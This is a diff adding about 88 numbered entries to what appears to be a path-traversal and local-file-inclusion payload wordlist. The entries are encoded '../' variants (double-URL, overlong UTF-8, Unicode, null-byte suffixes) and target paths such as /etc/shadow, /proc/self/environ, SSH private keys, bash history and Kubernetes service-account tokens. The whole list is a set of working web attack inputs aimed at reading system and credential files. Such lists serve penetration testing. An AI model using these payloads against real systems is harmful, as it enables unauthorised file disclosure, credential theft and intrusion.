@@ -1,3 +1,63 @@
+1. ../
+2. ..\
+3. ..\/
+4. %2e%2e%2f
+5. %252e%252e%252f
+6. %c0%ae%c0%ae%c0%af
+7. %uff0e%uff0e%u2215
+8. %uff0e%uff0e%u2216
+9. . = %u002e
+10. / = %u2215
+11. \ = %u2216
+12. . = %c0%2e, %e0%40%ae, %c0ae
+13. / = %c0%af, %e0%80%af, %c0%2f
+14. \ = %c0%5c, %c0%80%5c
+15. ..././
+16. ...\.\
+17. ..;/
+18. ..;/..;/sensitive.txt 
+19. . = %252e
+20. / = %252f
+21. \ = %255c
+22. file:///etc/passwd
+23. http://127.0.0.1:8080
+24. /etc/issue
+25. /etc/passwd
+26. /etc/shadow
+27. /etc/group
+28. /etc/hosts
+29. /etc/motd
+30. /etc/mysql/my.cnf
+31. /proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+32. /proc/self/environ
+33. /proc/version
+34. /proc/cmdline
+35. /proc/sched_debug
+36. /proc/mounts
+37. /proc/net/arp
+38. /proc/net/route
+39. /proc/net/tcp
+40. /proc/net/udp
+41. /proc/self/cwd/index.php
+42. /proc/self/cwd/main.py
+43. /home/$USER/.bash_history
+44. /home/$USER/.ssh/id_rsa
+45. /run/secrets/kubernetes.io/serviceaccount/token
+46. /run/secrets/kubernetes.io/serviceaccount/namespace
+47. /run/secrets/kubernetes.io/serviceaccount/certificate
+48. /var/run/secrets/kubernetes.io/serviceaccount
+49. /var/lib/mlocate/mlocate.db
+50. /var/lib/mlocate.db
+51. /var/log/apache/access.log
+52. /var/log/apache/error.log
+53. /var/log/httpd/error_log
+54. /usr/local/apache/log/error_log
+55. /usr/local/apache2/log/error_log
+56. /var/log/nginx/access.log
+57. /var/log/nginx/error.log
+58. /var/log/vsftpd.log
+59. /var/log/sshd.log
+60. /var/log/mail
 /etc/passwd
 ../../etc/passwd
 ../etc/passwd
@@ -942,3 +1002,32 @@ etc/passwd
 ....//....//etc/passwd
 ....//etc/passwd/./././././././././././etc/passwd
 ///////../../../etc/passwd
+61. %252e%252e/%252e%252e/%252e%252e//etc/passwd
+62. %252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+63. %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+64. %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+65. %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+66. %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+67. %252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+68. %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+69. %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+70. %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+71. %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+72. %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+73. ../../../../../../../../../etc/passwd
+74. ../../../../../../../../etc/passwd
+75. ../../../../../../../etc/passwd
+76. ../../../../../../etc/passwd
+77. ../../../../../etc/passwd
+78. ../../../../etc/passwd
+79. ../../../etc/passwd
+80. %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+81. %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+82. %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+83. %2e%2e%
+2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+84. %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+85. %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+86. %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+87. /../../../../../../../../../../../etc/passwd%00.jpg
+88. /../../../../../../../../etc/passwd%00.gif
